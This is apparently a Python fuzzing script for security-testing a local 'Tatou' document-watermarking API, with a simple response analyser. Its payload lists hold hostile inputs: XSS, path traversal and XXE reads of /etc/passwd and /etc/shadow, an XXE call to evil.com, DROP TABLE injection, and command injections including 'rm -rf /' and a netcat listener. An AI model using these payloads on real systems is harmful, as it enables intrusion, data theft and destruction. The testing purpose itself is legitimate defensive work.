#!/usr/bin/env python3
"""
Comprehensive Fuzzing Campaign for Tatou API
Generates regression and non-regression tests based on findings
"""

import requests
import json
import time
import random
import string
import os
import sys
from datetime import datetime
from pathlib import Path

class TatouFuzzer:
    def __init__(self, base_url="http://localhost:5000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.token = None
        self.results = {
            'vulnerabilities': [],
            'errors': [],
            'successes': [],
            'statistics': {}
        }
        self.test_user = {
            'email': 'fuzzer@test.com',
            'password': 'FuzzerTest123!',
            'login': 'fuzzer_test'
        }
        
    def setup_auth(self):
        """Setup authentication for testing"""
        try:
            # Create test user
            create_resp = self.session.post(
                f"{self.base_url}/api/create-user",
                json=self.test_user,
                timeout=10
            )
            
            # Login to get token
            login_resp = self.session.post(
                f"{self.base_url}/api/login",
                json={'email': self.test_user['email'], 'password': self.test_user['password']},
                timeout=10
            )
            
            if login_resp.status_code == 200:
                self.token = login_resp.json().get('token')
                print(f"✅ Authentication successful")
                return True
            else:
                print(f"❌ Authentication failed: {login_resp.status_code}")
                return False
                
        except Exception as e:
            print(f"❌ Auth setup failed: {e}")
            return False
    
    def generate_payloads(self):
        """Generate various fuzzing payloads"""
        payloads = {
            'xss': [
                '<script>alert("XSS")</script>',
                '"><script>alert("XSS")</script>',
                "javascript:alert('XSS')",
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '"><img src=x onerror=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')"></iframe>',
                '<body onload=alert("XSS")>'
            ],
            'path_traversal': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '..%252f..%252f..%252fetc%252fpasswd',
                '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>'
            ],
            'sql_injection': [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM users --",
                "1' OR 1=1 --",
                "admin'--",
                "' OR 1=1 LIMIT 1 --"
            ],
            'command_injection': [
                '; ls -la',
                '| whoami',
                '&& cat /etc/passwd',
                '`id`',
                '$(whoami)',
                '; rm -rf /',
                '| nc -l 4444'
            ],
            'buffer_overflow': [
                'A' * 1000,
                'A' * 10000,
                'A' * 100000,
                '\x00' * 1000,
                '\xff' * 1000
            ],
            'format_string': [
                '%s%s%s%s%s%s%s%s%s%s',
                '%n%n%n%n%n%n%n%n%n%n',
                '%x%x%x%x%x%x%x%x%x%x',
                '%p%p%p%p%p%p%p%p%p%p'
            ],
            'prototype_pollution': [
                '{"__proto__":{"isAdmin":true}}',
                '{"constructor":{"prototype":{"isAdmin":true}}}',
                '{"__proto__":{"polluted":"true"}}'
            ]
        }
        return payloads
    
    def test_endpoint(self, endpoint, method='GET', payload=None, headers=None):
        """Test a specific endpoint with given payload"""
        url = f"{self.base_url}{endpoint}"
        
        if headers is None:
            headers = {}
        
        if self.token:
            headers['Authorization'] = f'Bearer {self.token}'
        
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, headers=headers, timeout=10)
            elif method.upper() == 'POST':
                if payload:
                    if isinstance(payload, dict):
                        response = self.session.post(url, json=payload, headers=headers, timeout=10)
                    else:
                        response = self.session.post(url, data=payload, headers=headers, timeout=10)
                else:
                    response = self.session.post(url, headers=headers, timeout=10)
            elif method.upper() == 'PUT':
                response = self.session.put(url, json=payload, headers=headers, timeout=10)
            elif method.upper() == 'DELETE':
                response = self.session.delete(url, headers=headers, timeout=10)
            else:
                return None
            
            return {
                'endpoint': endpoint,
                'method': method,
                'payload': payload,
                'status_code': response.status_code,
                'response': response.text,
                'headers': dict(response.headers),
                'url': url
            }
            
        except Exception as e:
            return {
                'endpoint': endpoint,
                'method': method,
                'payload': payload,
                'error': str(e),
                'url': url
            }
    
    def analyze_response(self, result):
        """Analyze response for vulnerabilities"""
        vulnerabilities = []
        
        if 'error' in result:
            return vulnerabilities
        
        response_text = result.get('response', '')
        status_code = result.get('status_code', 0)
        
        # Check for XSS vulnerabilities
        if any(xss_payload in response_text for xss_payload in ['<script>', 'javascript:', 'onerror=', 'onload=']):
            vulnerabilities.append({
                'type': 'XSS',
                'severity': 'CRITICAL',
                'description': 'Cross-Site Scripting vulnerability detected',
                'payload': result.get('payload'),
                'response_snippet': response_text[:200]
            })
        
        # Check for Path Traversal
        if any(path_payload in response_text for path_payload in ['/etc/passwd', '/etc/shadow', '..\\..\\']):
            vulnerabilities.append({
                'type': 'PATH_TRAVERSAL',
                'severity': 'HIGH',
                'description': 'Path traversal vulnerability detected',
                'payload': result.get('payload'),
                'response_snippet': response_text[:200]
            })
        
        # Check for Information Disclosure
        if any(info in response_text for info in ['Traceback', 'File "', 'line ', 'Exception:', 'Error:']):
            vulnerabilities.append({
                'type': 'INFORMATION_DISCLOSURE',
                'severity': 'HIGH',
                'description': 'Information disclosure through error messages',
                'payload': result.get('payload'),
                'response_snippet': response_text[:200]
            })
        
        # Check for XXE
        if '<?xml' in response_text and ('<!DOCTYPE' in response_text or '&' in response_text):
            vulnerabilities.append({
                'type': 'XXE',
                'severity': 'HIGH',
                'description': 'XML External Entity vulnerability detected',
                'payload': result.get('payload'),
                'response_snippet': response_text[:200]
            })
        
        # Check for SQL Injection
        if any(sql_payload in response_text for sql_payload in ['mysql', 'sqlite', 'postgresql', 'ORA-', 'SQL syntax']):
            vulnerabilities.append({
                'type': 'SQL_INJECTION',
                'severity': 'HIGH',
                'description': 'SQL injection vulnerability detected',
                'payload': result.get('payload'),
                'response_snippet': response_text[:200]
            })
        
        return vulnerabilities
    
    def run_fuzzing_campaign(self):
        """Run comprehensive fuzzing campaign"""
        print("🚀 Starting Tatou API Fuzzing Campaign")
        print("=" * 50)
        
        # Setup authentication
        if not self.setup_auth():
            print("❌ Cannot proceed without authentication")
            return
        
        # Get payloads
        payloads = self.generate_payloads()
        
        # Define endpoints to test
        endpoints = [
            '/api/login',
            '/api/create-user',
            '/api/upload-document',
            '/api/list-documents',
            '/api/get-document',
            '/api/create-watermark',
            '/api/read-watermark',
            '/api/list-versions',
            '/api/list-all-versions',
            '/api/delete-document',
            '/api/get-version',
            '/api/rmap-initiate',
            '/api/rmap-get-link',
            '/api/get-watermarking-methods',
            '/healthz'
        ]
        
        total_tests = 0
        vulnerabilities_found = 0
        
        for endpoint in endpoints:
            print(f"\n🔍 Testing endpoint: {endpoint}")
            
            # Test with various payloads
            for payload_type, payload_list in payloads.items():
                for payload in payload_list[:3]:  # Limit to 3 payloads per type for efficiency
                    total_tests += 1
                    
                    # Test different HTTP methods
                    for method in ['GET', 'POST']:
                        result = self.test_endpoint(endpoint, method, payload)
                        if result:
                            vulns = self.analyze_response(result)
                            if vulns:
                                vulnerabilities_found += len(vulns)
                                self.results['vulnerabilities'].extend(vulns)
                                for vuln in vulns:
                                    print(f"  🚨 {vuln['type']} vulnerability found!")
                            
                            self.results['successes'].append(result)
        
        # Generate statistics
        self.results['statistics'] = {
            'total_tests': total_tests,
            'vulnerabilities_found': vulnerabilities_found,
            'endpoints_tested': len(endpoints),
            'timestamp': datetime.now().isoformat()
        }
        
        print(f"\n📊 Fuzzing Campaign Complete!")
        print(f"Total tests: {total_tests}")
        print(f"Vulnerabilities found: {vulnerabilities_found}")
        
        return self.results
    
    def save_results(self, filename=None):
        """Save fuzzing results to file"""
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"fuzzing_results_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"📁 Results saved to: {filename}")
        return filename

def main():
    """Main function"""
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    
    fuzzer = TatouFuzzer(base_url)
    results = fuzzer.run_fuzzing_campaign()
    fuzzer.save_results()
    
    # Print summary
    print("\n" + "=" * 50)
    print("FUZZING CAMPAIGN SUMMARY")
    print("=" * 50)
    
    vuln_types = {}
    for vuln in results['vulnerabilities']:
        vuln_type = vuln['type']
        vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
    
    for vuln_type, count in vuln_types.items():
        print(f"{vuln_type}: {count} instances")
    
    print(f"\nTotal vulnerabilities: {len(results['vulnerabilities'])}")
    print(f"Total tests executed: {results['statistics']['total_tests']}")

if __name__ == "__main__":
    main()

